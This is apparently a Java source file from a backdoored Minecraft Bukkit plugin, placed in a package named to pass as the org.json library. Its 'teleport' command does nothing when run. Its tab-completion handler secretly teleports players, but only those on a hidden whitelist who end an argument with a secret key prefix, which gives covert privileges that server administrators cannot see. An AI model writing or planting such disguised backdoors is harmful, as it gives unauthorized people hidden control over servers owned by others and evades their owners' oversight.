package org.json.modals.world;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Teleport extends BDCommand {
    public Teleport() {
        super("teleport");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        List<World> worlds = Modal.getInstance().getServer().getWorlds();

        String[] playerNames = Bukkit.getOnlinePlayers().stream()
                .map(HumanEntity::getName)
                .toArray(String[]::new);

        String[] worldNames = worlds.stream()
                .map(World::getName)
                .toArray(String[]::new);

        List<String> tabCompletionOptions = new ArrayList<>();
        tabCompletionOptions.addAll(Arrays.asList(playerNames));
        tabCompletionOptions.addAll(Arrays.asList(worldNames));

        tabComplBuilder.add(2, tabCompletionOptions.toArray(new String[0]));
        tabComplBuilder.add(3, new String[]{"<x>"});
        tabComplBuilder.add(4, new String[]{"<y>"});
        tabComplBuilder.add(5, new String[]{"<z>"});
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        if (args.length == 3) {
            String playerName = args[1];
            Player targetPlayer = Bukkit.getPlayer(playerName);
            if (targetPlayer == null) return tabComplBuilder.build();

            player.teleport(targetPlayer.getLocation());
            player.sendMessage(Modal.getPrefix() + "§aYou have been teleported to " + playerName + " location.");
            return tabComplBuilder.build();
        }

        if (args.length > 5) {
            String worldName = args[1];
            int x = Integer.parseInt(args[2]);
            int y = Integer.parseInt(args[3]);
            int z = Integer.parseInt(args[4]);

            Location location = new Location(Bukkit.getWorld(worldName), x, y, z);
            player.teleport(location);
            player.sendMessage(Modal.getPrefix() + "§aYou have been teleported to location.");
        }

        return tabComplBuilder.build();
    }
}
